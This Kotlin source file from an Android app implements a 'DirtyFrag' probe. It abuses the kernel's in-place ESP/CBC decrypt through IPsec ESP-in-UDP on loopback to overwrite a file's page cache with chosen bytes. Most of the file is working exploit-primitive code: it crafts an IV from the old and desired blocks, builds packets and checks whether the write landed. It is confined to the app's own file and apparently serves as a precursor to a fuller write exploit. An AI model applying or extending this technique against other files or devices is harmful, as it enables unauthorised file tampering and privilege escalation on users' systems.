package com.ghostlock.app.data

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.SystemClock
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.io.RandomAccessFile
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.nio.ByteBuffer
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * Pre-W1 DirtyFrag viability probe (protocol 1).
 *
 * It runs the page-cache primitive on a 16-byte block of the app's own file:
 * one ESP-in-UDP packet whose payload is spliced from the file page, the IV
 * crafted so the kernel's in-place CBC decrypt writes the desired bytes. A
 * file-free positive control (a valid inner UDP segment under the same SA,
 * received on a loopback socket) proves the SA/policy/decrypt path first, so a
 * file block that stays unchanged is attributable to the send path or the ESP
 * guard, not to a missing transform.
 *
 * Own file only, no root, one block, bounded waits. A watchdog marker left
 * behind by a killed probe is reported as [Outcome.Crashed] and the probe is
 * never retried automatically. See docs/analysis/dirtyfrag-viability-probe-plan.md.
 */
internal object DirtyfragProbe {
    const val ProtocolVersion = 1L
    const val Tag = "DirtyfragProbe"

    private const val ProbeFileName = "df-probe.bin"
    private const val MarkerFileName = ".df-probe-in-progress"
    private val ControlSentinel = "DF-CONTROL-16B!!".toByteArray(Charsets.US_ASCII)
    private val FileDesired = "DIRTYFRAG-PROBE!".toByteArray(Charsets.US_ASCII)
    private const val ControlTimeoutMs = 2000
    private const val FileReadBackMs = 1000L
    private const val FilePollMs = 50L

    enum class Outcome { Pass, PrimitiveFailed, SetupFailed, Crashed }

    data class Result(val outcome: Outcome, val reason: String, val evidence: String)

    private external fun nativeSendEspWrite(
        path: String,
        offset: Long,
        spi: Int,
        seq: Int,
        iv: ByteArray,
        encapPort: Int,
        senderPort: Int,
    ): Int

    /** Runs the probe; call off the main thread. */
    @Synchronized
    fun run(context: Context, filesDir: File): Result {
        val marker = File(filesDir, MarkerFileName)
        if (marker.isFile) {
            val prior = runCatching { marker.readText() }.getOrDefault("")
            marker.delete()
            return Result(Outcome.Crashed, "a previous probe did not finish", "marker=$prior")
        }
        runCatching {
            marker.writeText(
                "kernel=${System.getProperty("os.version").orEmpty()};" +
                    "elapsed=${SystemClock.elapsedRealtime()};rom=${android.os.Build.FINGERPRINT}",
            )
        }
        try {
            return runInternal(context, filesDir)
        } finally {
            marker.delete()
        }
    }

    private fun runInternal(context: Context, filesDir: File): Result {
        val probeFile = File(filesDir, ProbeFileName)
        val initial = ByteArray(64) { (0x40 + it).toByte() }
        val created = runCatching {
            FileOutputStream(probeFile).use { out ->
                out.write(initial)
                out.fd.sync()
            }
        }
        if (created.isFailure) return setup("probe file: ${created.exceptionOrNull()?.message}")

        val key = ByteArray(32).also { SecureRandom().nextBytes(it) }
        val ipsec = context.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
            ?: return setup("no IpSecManager")
        val loopback = InetAddress.getByName("127.0.0.1")
        var encap: IpSecManager.UdpEncapsulationSocket? = null
        var spiObj: IpSecManager.SecurityParameterIndex? = null
        var transform: IpSecTransform? = null
        try {
            encap = ipsec.openUdpEncapsulationSocket()
            spiObj = ipsec.allocateSecurityParameterIndex(loopback)
            val senderProbe = DatagramSocket()
            val senderPort = senderProbe.localPort
            senderProbe.close()
            transform = IpSecTransform.Builder(context)
                .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, key))
                .setIpv4Encapsulation(encap, senderPort)
                .buildTransportModeTransform(loopback, spiObj)
            val encapPort = encap.port
            val spi = spiObj.spi

            val control = runControl(loopback, key, spi, encapPort, senderPort)
            if (!control.ok) return setup(control.reason, control.evidence)

            /* Lazy so the marker/crash path is testable without the native lib. */
            System.loadLibrary("dfprobe")
            val old = readBlock(probeFile) ?: return setup("probe file read failed")
            val iv = ProbeCrypto.ivFor(key, old, FileDesired)
            var rc = -1
            var now = old
            var seq = 2
            val deadline = SystemClock.elapsedRealtime() + FileReadBackMs
            while (true) {
                rc = nativeSendEspWrite(
                    probeFile.absolutePath, 0, spi, seq++, iv, encapPort, senderPort,
                )
                if (rc != 0) break
                Thread.sleep(FilePollMs)
                now = readBlock(probeFile) ?: old
                if (now.contentEquals(FileDesired)) break
                if (SystemClock.elapsedRealtime() >= deadline) break
            }
            val evidence = "control=pass rc=$rc block=${hex(old)}->${hex(now)} " +
                "want=${hex(FileDesired)} spi=${Integer.toUnsignedString(spi)} " +
                "encap=$encapPort sender=$senderPort protocol=$ProtocolVersion"
            return when (ProbeCrypto.classify(controlOk = true, sendRc = rc, changed = now.contentEquals(FileDesired))) {
                Outcome.Pass -> Result(Outcome.Pass, "page-cache write landed", evidence)
                Outcome.SetupFailed -> setup("probe send failed rc=$rc", evidence)
                else -> Result(Outcome.PrimitiveFailed, "control passed but the block did not change", evidence)
            }
        } catch (t: Throwable) {
            return setup("probe exception: ${t::class.simpleName}: ${t.message}")
        } finally {
            runCatching { transform?.close() }
            runCatching { spiObj?.close() }
            runCatching { encap?.close() }
            runCatching { probeFile.delete() }
        }
    }

    private data class Control(val ok: Boolean, val reason: String, val evidence: String)

    private fun runControl(
        loopback: InetAddress,
        key: ByteArray,
        spi: Int,
        encapPort: Int,
        senderPort: Int,
    ): Control {
        var receiver: DatagramSocket? = null
        var sender: DatagramSocket? = null
        return try {
            receiver = DatagramSocket(0, loopback)
            receiver.soTimeout = ControlTimeoutMs
            val dstPort = receiver.localPort
            val packet = ProbeCrypto.controlPacket(
                key, spi, 1, ControlSentinel, 40000, dstPort,
            )
            sender = DatagramSocket(senderPort, loopback)
            sender.send(DatagramPacket(packet, packet.size, loopback, encapPort))
            sender.close()
            sender = null
            val buf = ByteArray(64)
            val incoming = DatagramPacket(buf, buf.size)
            receiver.receive(incoming)
            val got = incoming.length
            val ok = got >= ControlSentinel.size &&
                buf.copyOf(ControlSentinel.size).contentEquals(ControlSentinel)
            val evidence = "control_rcv=$got from=${incoming.socketAddress} " +
                "data=${hex(buf.copyOf(minOf(got, 32)))}"
            Control(ok, if (ok) "" else "positive control did not return the sentinel", evidence)
        } catch (t: Throwable) {
            Control(false, "positive control failed: ${t::class.simpleName}: ${t.message}", "")
        } finally {
            runCatching { sender?.close() }
            runCatching { receiver?.close() }
        }
    }

    private fun setup(reason: String, evidence: String = ""): Result =
        Result(Outcome.SetupFailed, reason, evidence)

    private fun readBlock(file: File): ByteArray? = runCatching {
        RandomAccessFile(file, "r").use { raf ->
            val block = ByteArray(16)
            raf.readFully(block)
            block
        }
    }.getOrNull()

    private fun hex(bytes: ByteArray): String = bytes.joinToString("") { "%02x".format(it) }
}

/**
 * The probe's pure pieces: the CBC IV formula, the positive-control packet, and
 * the result classification. Kept free of Android APIs so the host tests cover
 * them directly.
 */
internal object ProbeCrypto {
    /** `IV = AES_ECB_DEC(key, old_block) XOR desired`, so CBC decrypt yields desired. */
    fun ivFor(key: ByteArray, oldBlock: ByteArray, desired: ByteArray): ByteArray {
        require(oldBlock.size == 16 && desired.size == 16) { "block must be 16 bytes" }
        val cipher = Cipher.getInstance("AES/ECB/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"))
        val dec = cipher.doFinal(oldBlock)
        return ByteArray(16) { (dec[it].toInt() xor desired[it].toInt()).toByte() }
    }

    /**
     * A valid ESP-in-UDP packet whose plaintext is an inner UDP segment with
     * [sentinel] plus the ESP padding/trailer (next header UDP=17), CBC
     * encrypted under [key]. Layout: SPI(4)+Seq(4)+IV(16)+ciphertext.
     */
    fun controlPacket(
        key: ByteArray,
        spi: Int,
        seq: Int,
        sentinel: ByteArray,
        srcPort: Int,
        dstPort: Int,
    ): ByteArray {
        require(sentinel.size == 16) { "sentinel must be 16 bytes" }
        val udp = ByteBuffer.allocate(8 + sentinel.size).apply {
            putShort(srcPort.toShort())
            putShort(dstPort.toShort())
            putShort((8 + sentinel.size).toShort())
            putShort(0)
            put(sentinel)
        }.array()
        val pad = (16 - ((udp.size + 2) % 16)) % 16
        val plain = ByteArray(udp.size + pad + 2)
        System.arraycopy(udp, 0, plain, 0, udp.size)
        plain[plain.size - 2] = pad.toByte()
        plain[plain.size - 1] = 17
        val iv = ByteArray(16).also { SecureRandom().nextBytes(it) }
        val cipher = Cipher.getInstance("AES/CBC/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"), IvParameterSpec(iv))
        val encrypted = cipher.doFinal(plain)
        return ByteBuffer.allocate(8 + 16 + encrypted.size).apply {
            putInt(spi)
            putInt(seq)
            put(iv)
            put(encrypted)
        }.array()
    }

    /** Test helper: decrypt the control packet's ciphertext. */
    fun controlPlaintext(key: ByteArray, packet: ByteArray): ByteArray {
        val iv = packet.copyOfRange(8, 24)
        val ciphertext = packet.copyOfRange(24, packet.size)
        val cipher = Cipher.getInstance("AES/CBC/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"), IvParameterSpec(iv))
        return cipher.doFinal(ciphertext)
    }

    /** Classifies a probe attempt. The control is authoritative for setup. */
    fun classify(controlOk: Boolean, sendRc: Int, changed: Boolean): DirtyfragProbe.Outcome = when {
        !controlOk -> DirtyfragProbe.Outcome.SetupFailed
        changed -> DirtyfragProbe.Outcome.Pass
        sendRc != 0 -> DirtyfragProbe.Outcome.SetupFailed
        else -> DirtyfragProbe.Outcome.PrimitiveFailed
    }
}
